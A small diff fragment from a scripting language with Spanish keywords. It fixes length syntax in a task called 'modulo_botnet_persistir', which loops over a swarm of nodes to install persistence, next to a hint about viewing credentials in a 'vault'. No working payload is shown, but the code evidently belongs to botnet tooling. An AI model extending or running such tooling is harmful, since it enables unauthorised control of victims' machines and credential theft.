@@ -56,9 +56,9 @@ tarea persistencia_ver:
     info("Usa 'vault' para ver credenciales.")
 
 tarea modulo_botnet_persistir:
-    si enjambre.len == 0: error("Enjambre vacío."); return
+    si len(enjambre) == 0: error("Enjambre vacío."); return
     
-    info("Instalando en " + str(enjambre.len) + " nodos...")
+    info("Instalando en " + str(len(enjambre)) + " nodos...")
     
     para nodo en enjambre:
         ip = nodo.key
